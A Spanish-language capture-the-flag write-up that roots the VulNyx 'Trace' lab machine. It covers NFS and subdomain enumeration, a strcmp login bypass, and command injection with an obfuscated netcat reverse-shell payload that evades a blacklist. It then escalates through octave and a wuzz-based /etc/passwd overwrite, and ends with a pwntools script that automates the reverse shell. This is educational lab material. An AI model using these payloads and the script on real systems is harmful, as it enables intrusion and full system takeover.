---
date: 2023-06-15 12:00:00
layout: post
title: Trace Writeup
subtitle: Writeup de la máquina Trace de la plataforma VulNyx
description: Realizaré la máquina Trace explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Dificil.
image: /assets/img/machines/Trace/Trace.png
optimized_image: /assets/img/machines/Trace/Trace.png
category: Writeup
tags:
  - VulNyx
  - Writeup
  - Linux
  - Hard
author: FredBrave
---
# Enumeración
Empezamos encontrando la ip de la máquina dentro de nuestro segmento de red.
```bash
$ sudo arp-scan 10.0.2.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:ec:3f:6c, IPv4: 10.0.2.48
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1	52:54:00:12:35:00	QEMU
10.0.2.2	52:54:00:12:35:00	QEMU
10.0.2.3	08:00:27:08:50:bd	PCS Systemtechnik GmbH
10.0.2.127	08:00:27:50:f1:f0	PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.129 seconds (120.24 hosts/sec). 4 responded
```
Ahora realizaremos dos escaneos a la ip, uno rápido para solo encontrar los puertos abiertos dentro de esta y otro más exhaustivo solo hacia los puertos abiertos encontrados en el anterior escaneo. Esto es para encontrar los servicios y sus versiones corriendo en los puertos.
```bash
$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.0.2.127 -oG Targeted                                                                                                                                                                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 11:40 EDT
Nmap scan report for 10.0.2.127
Host is up (0.00012s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
32951/tcp open  unknown
33343/tcp open  unknown
52173/tcp open  unknown
58947/tcp open  unknown
MAC Address: 08:00:27:50:F1:F0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds

$ sudo nmap -p22,80,111,2049,32951,33343,52173,58947 -sCV 10.0.2.127 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 11:40 EDT
Nmap scan report for 10.0.2.127
Host is up (0.00043s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0e624fb9eb07a1abdf7b185237fb16f (RSA)
|   256 99c87431451058b0cecc63b47a82573d (ECDSA)
|_  256 60da3e3138fab549ab48c3432c9fd132 (ED25519)
80/tcp    open  http     Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41682/udp6  mountd
|   100005  1,2,3      44878/udp   mountd
|   100005  1,2,3      50517/tcp6  mountd
|   100005  1,2,3      52173/tcp   mountd
|   100021  1,3,4      33343/tcp   nlockmgr
|   100021  1,3,4      34273/tcp6  nlockmgr
|   100021  1,3,4      36176/udp   nlockmgr
|   100021  1,3,4      40492/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
32951/tcp open  mountd   1-3 (RPC #100005)
33343/tcp open  nlockmgr 1-4 (RPC #100021)
52173/tcp open  mountd   1-3 (RPC #100005)
58947/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:50:F1:F0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds
```
Encontramos muchos puertos de entre ellos los más interesantes son el 80 y el 2049. Enumero el servicio http del 80, pero no encontré nada. Así que seguí a enumerar el puerto 2049.

# Enumerando NFS (Network File System)

El servicio NFS (Network File System) es un app server/client que nos permite guardar archivos en un computador remoto. Por lo tanto comenzaremos enumerando que archivos están subidos en este servicio.

```bash
showmount -e 10.0.2.127
Export list for 10.0.2.127:
/var/www/html *
```
Parece que se está compartiendo la carpeta que almacena los archivos de la web, por lo que proseguimos a montarla en una montura dentro de nuestra máquina.

Creamos una carpeta donde almacenaremos la montura dentro del directorio /mnt. Y proseguimos a montar la carpeta /var/www/html con todos sus archivos en esta carpeta.
```bash
$ sudo mkdir /mnt/mount

$ sudo mount -t nfs 10.0.2.127:/var/www/html /mnt/mount -nolock
```
Al montarlo entraremos a esta carpeta y podremos ver los archivos que se almacenaban dentro de la carpeta compartida.
```bash
$ cd /mnt/mount
$ ls 
7828d2f51ceb3aefbd12aa383ec9d5e9  index.html
```
Intento entrar a la carpeta con el hash raro, pero al intentarlo me dice que no tengo los permisos, al hacer un ls -la podemos ver que las carpetas son pertenecientes al usuario www-data.
```bash
ls -la
total 24
drwxrwxrwx 3 www-data www-data  4096 Jun 13 11:30 .
drwxr-xr-x 7 root     root      4096 Jun 15 11:59 ..
drwx------ 2 www-data www-data  4096 Jun 13 11:01 7828d2f51ceb3aefbd12aa383ec9d5e9
-rw------- 1 www-data www-data 10701 Jun 12 15:41 index.html
```
Me convierto en www-data para tratar de enumerar la carpeta correctamente. Para hacer esto primero debo de ser root.
```bash
$ sudo su
$ su -s /bin/bash www-data
www-data@kali:/mnt/mount$
```
Ahora como www-data trate de crear un archivo para ver si puedo crear archivos dentro de la carpeta compartida.
```bash
www-data@kali:/mnt/mount$ touch shell.php
touch: cannot touch 'shell.php': Read-only file system
```
Al parecer es solo una carpeta compartida con los permisos read. No podemos crear solo ver los archivos. Seguí a enumerar la carpeta con el nombre raro y encontré un archivo con un dominio.
```bash
www-data@kali:/mnt/mount$ cd 7828d2f51ceb3aefbd12aa383ec9d5e9/
www-data@kali:/mnt/mount/7828d2f51ceb3aefbd12aa383ec9d5e9$ ls
index.html
www-data@kali:/mnt/mount/7828d2f51ceb3aefbd12aa383ec9d5e9$ cat index.html 
<h2>Hi</h2>

<script>
    window.location.href = "http://staffserve.nyx";
</script>
```
Agregue el dominio al archivo /etc/hosts y como no había encontrado nada en la web por defecto trate de encontrar un subdominio.
```bash
$ sudo nano /etc/hosts
$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
#No son del sistema
10.0.2.127  staffserve.nyx

$ ffuf -u http://staffserve.nyx/ -w /home/kali/Ayuditas/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -H "Host: FUZZ.staffserve.nyx" -fw 3427

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://staffserve.nyx/
 :: Wordlist         : FUZZ: /home/kali/Ayuditas/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.staffserve.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 3427
________________________________________________

[Status: 200, Size: 434, Words: 72, Lines: 21, Duration: 28ms]
    * FUZZ: admin3
```

Encontramos un subdominio, lo agregamos al /etc/hosts

```bash
cat /etc/hosts 
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
#No son del sistema
10.0.2.127  staffserve.nyx  admin3.staffserve.nyx
```

# Shell como www-data
Abro el navegador, entro al subdominio y me encuentro con un login.
<img class="img" src="/assets/img/machines/Trace/1.png" width="1000">
# Strcmp Bypass
Intente con claves por defecto, pero al no encontrar las credenciales intento bypass el login con diferentes clases de vulnerabilidades hasta que encuentro que el strcmp bypass funciona.
<img class="img" src="/assets/img/machines/Trace/2.png" width="800">
<img class="img" src="/assets/img/machines/Trace/3.png" width="800">

La web me dio otro dominio.

<img class="img" src="/assets/img/machines/Trace/4.png" width="1000">

Agregue este dominio al archivo /etc/hosts y lo enumere, pero no encontré nada interesante por lo cual trate de encontrar un subdominio de este dominio.

```bash
$ ffuf -u http://networkteste.nyx/ -w /home/kali/Ayuditas/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -H "Host: FUZZ.networkteste.nyx" -fw 3427

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://networkteste.nyx/
 :: Wordlist         : FUZZ: /home/kali/Ayuditas/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.networkteste.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 3427
________________________________________________

[Status: 200, Size: 200, Words: 17, Lines: 8, Duration: 24ms]
    * FUZZ: ping
```

Otro subdominio que agregamos al /etc/hosts una vez hecho esto entramos al subdominio por el navegador.

```bash
$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
#No son del sistema
10.0.2.127  staffserve.nyx  admin3.staffserve.nyx networkteste.nyx ping.networkteste.nyx
```
# Command OS Injection
<img class="img" src="/assets/img/machines/Trace/5.png" width="900">
El subdominio parece tener una utilidad que permite hacer un ping a una ip. Probaremos esto y al ver el output podemos notar que ejecuta el ping directamente como si fuera un comando del sistema.
<img class="img" src="/assets/img/machines/Trace/6.png" width="900">
Asi que tratamos de agregar un comando mas con | para observer si lo ejecuta y lo hace.
<img class="img" src="/assets/img/machines/Trace/7.png" width="800">

<img class="img" src="/assets/img/machines/Trace/8.png" width="800">

Aquí tuve que encontrar algún payload que me sirviera lo cual fue dificil, ya que todos los comandos que se utilizan generalmente para un reverse shell estaban en una blacklist además de algunos directorios importantes. Luego de probar diferentes payloads para una reverse shell el siguiente me funciono `/usr/b?n/n[c] -e /\\b\i\n/////s\h 10.0.2.48 443`.

Mande el payload a través de burpsuite me quedo de esta manera.

<img class="img" src="/assets/img/machines/Trace/9.png" width="800">

```shell
$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.0.2.48] from (UNKNOWN) [10.0.2.127] 34250
```
Hice un tratamiento de la tty
```shell
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@trace:/var/www/site2$ ^Z
[1]  + 5172 suspended  nc -nlvp 443
CTRL + Z    
$ stty raw -echo;fg
[1]  + 5172 continued  nc -nlvp 443

www-data@trace:/var/www/site2$ export TERM=xterm
www-data@trace:/var/www/site2$ export SHELL=bash
www-data@trace:/var/www/site2$ stty rows 48 columns 238
www-data@trace:/var/www/site2$ whoami
www-data
```
# Shell como yan
Recordé que había un login que se hacía a través de la función strcmp para esto la función necesita que la clave este escrita dentro del script por lo que lo revise y encontré una clave.
```shell
www-data@trace:/var/www/site1$ cd /var/www/site1
www-data@trace:/var/www/site1$ ls   
index.php  random.php
www-data@trace:/var/www/site1$ cat random.php 
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
  </head>
  <body>

<?php
  if(!strcmp($_POST['login'], "admin") && !strcmp($_POST['password'], "m3g4S3cuR3p4zzW0rd"))
  {
?>

<h1>Site Under Maintenance</h1>
<br>
<p>For network tests you can use the domain: <strong>networkteste.nyx</strong></p>
<br>
<br>
<br>
</p>

<?php
    }
    else
    {
        echo '<p>Invalid Credentials</p>';
    }
?>

  </body>
</html>
www-data@trace:/var/www/site1$
```
Enumere los usuarios con el /etc/passwd y probé la clave con estos, de esta manera encontré que la clave era del usuario yan.
```shell
www-data@trace:/var/www/site1$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
yan:x:1000:1000:yan,,,:/home/yan:/bin/bash
nel:x:1001:1001::/home/nel:/bin/bash
www-data@trace:/var/www/site1$ su yan
Password: 
yan@trace:/var/www/site1$ whoami
yan
```
# Shell como nel
El usuario yan puede ejecutar el binario octave como nel, existe una forma de escalar con el binario octave en <a href='https://gtfobins.github.io/gtfobins/octave/'>gtfo-bins</a> por lo que solo seguí las instrucciones y obtuve una shell como nel.
```shell
yan@trace:~$ sudo -u nel octave --eval 'system("/bin/sh")'
octave: X11 DISPLAY environment variable not set
]octave: disabling GUI features
$ whoami
/bin/sh: 1: ]whoami: not found
$ ls
ls: no se puede abrir el directorio '.': Permiso denegado
$ bash
nel@trace:/home/yan$ whoami
nel
```
# Shell como root
El usuario nel puede ejecutar wuzz como root, usando la herramienta y entendiendo como funciona encontré una forma de escalar a root. Para esto hice una llave ssh para poder entrar al ssh directamente. Una vez creada las llaves la id\_rsa.pub la copie y la pegue en el archivo /home/nel/.ssh/authorized\_keys (Si no existe lo creas). Y pude entrar como nel a través de ssh.
```shell
nel@trace:/home/yan$ sudo -l
Matching Defaults entries for nel on trace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nel may run the following commands on trace:
    (root) NOPASSWD: /usr/bin/wuzz
nel@trace:/home/yan$ mkdir /home/nel/.ssh/
nel@trace:/home/yan$ nano /home/nel/.ssh/authorized_keys
```
```shell
ssh nel@10.0.2.127
The authenticity of host '10.0.2.127 (10.0.2.127)' can't be established.
ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:239: [hashed name]
    ~/.ssh/known_hosts:251: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.127' (ED25519) to the list of known hosts.
nel@trace:~$
```
Ahora copiaremos el contenido del /etc/passwd de la máquina.
```shell
nel@trace:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
_rpc:x:106:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:107:65534::/var/lib/nfs:/usr/sbin/nologin
yan:x:1000:1000:yan,,,:/home/yan:/bin/bash
nel:x:1001:1001::/home/nel:/bin/bash
```
Y lo pegamos en nuestra máquina en cualquier directorio.
```shell
$ nano passwd
$ cat passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
_rpc:x:106:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:107:65534::/var/lib/nfs:/usr/sbin/nologin
yan:x:1000:1000:yan,,,:/home/yan:/bin/bash
nel:x:1001:1001::/home/nel:/bin/bash
```
Ahora crearemos una clave con openssl para el /etc/passwd
```shell
openssl passwd
Password: 
Verifying - Password: 
$1$ikTDnOVE$6dJA58VzV.Wc9nN.ivCbt0
```
Copiamos el hash resultante y lo intercambiamos por la primera x después del root en el passwd que copiamos.
```shell
$ cat passwd 
root:$1$ikTDnOVE$6dJA58VzV.Wc9nN.ivCbt0:0:0:root:/root:/bin/bash
...
...
```
Ahora creamos un servidor web con python  en el directorio en donde esté el passwd que copiamos.
```shell
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
En la máquina víctima ejecutamos como root el wuzz.
<img class="img" src="/assets/img/machines/Trace/10.png" width="1200">
Nos sale esta interfaz, en el URL pondremos la dirección de nuestro servidor web apuntando al archivo passwd.
<img class="img" src="/assets/img/machines/Trace/11.png" width="1000">
Daremos enter y nos deberia salir el contenido del passwd que copiamos. Si no sale has hecho algo mal.
<img class="img" src="/assets/img/machines/Trace/12.png" width="1200">
Y ahora presionamos CTRL + s para guardar la respuesta de la petición y lo guardaremos en /etc/passwd.
<img class="img" src="/assets/img/machines/Trace/13.png" width="900">
Una vez guardado salimos con un CTRL + C y tratamos de logearnos como root con la clave que pusimos en el openssl.
```shell
nel@trace:~$ su root
Contraseña: 
root@trace:/home/nel# whoami
root
```
Hemos pwneado la maquina!!!

# Bonus
Para practicar un poco de python decidí hacer un script automatizado que pwneara la máquina lo conseguí hasta el usuario nel, pero no se me ocurrió una forma de llegar al root con mi conocimiento actual. Aun así aquí les dejo el script que cree.
```python3
from pwn import *
import sys, requests, signal, time, threading

def Exiting(sig, frame):
    print("Exiting...")
    sys.exit(1)

#CTRL + C
signal.signal(signal.SIGINT, Exiting)

# Variables
url = 'http://ping.networkteste.nyx/'
host = '10.0.2.48' #Cambiar a tu ip
lport = 443 #Cambiar al que quieras
def obtainShell():
    p1 = log.progress("Command Injection")
    time.sleep(1)
    p1.status("Performing Command Injection...")
    time.sleep(1)
    data ={
        'pinger':'{}|/usr/b*n/n[c] -e /\\b\i\\n/////s\h {} {}'.format(host, host, lport),
        'submitt': ''
    }
    r = requests.post(url, data=data)
    p1.success("Command Injection Success!!!")



def main():
    try:
        threading.Thread(target=obtainShell).start()
    except:
        print("Error...")
        sys.exit(1)

    shell = listen(lport, timeout=10).wait_for_connection()

    if shell.sock is None:
        log.failure("Conexion is None")
        sys.exit()
    else:
        log.info("Access to system as www-data")
        time.sleep(1)
    p3 = log.progress("PrivEsc to yan user")
    p3.status("Loggins as yan user")
    shell.sendline("su yan")
    time.sleep(1)
    shell.sendline("m3g4S3cuR3p4zzW0rd")
    p3.success("Log as yan user")
    p4 = log.progress("PrivEsc to nel user")
    time.sleep(1)
    p4.status("Exploiting Octave Binary")
    time.sleep(1)
    shell.sendline("sudo -u nel octave --eval \"system('/bin/sh')\"")
    p4.success("Log as nel user")
    time.sleep(1)
    shell.interactive()


    
if __name__ == '__main__':
    main()
```
Ya tendrán que tener los dominios en el /etc/hosts para ejecutar el script otra cosa es cambiar la variable host por tu ip y eso sería todo. Se ejecuta de la siguiente manera.
<img class="img" src="/assets/img/machines/Trace/script.png" width="1000">
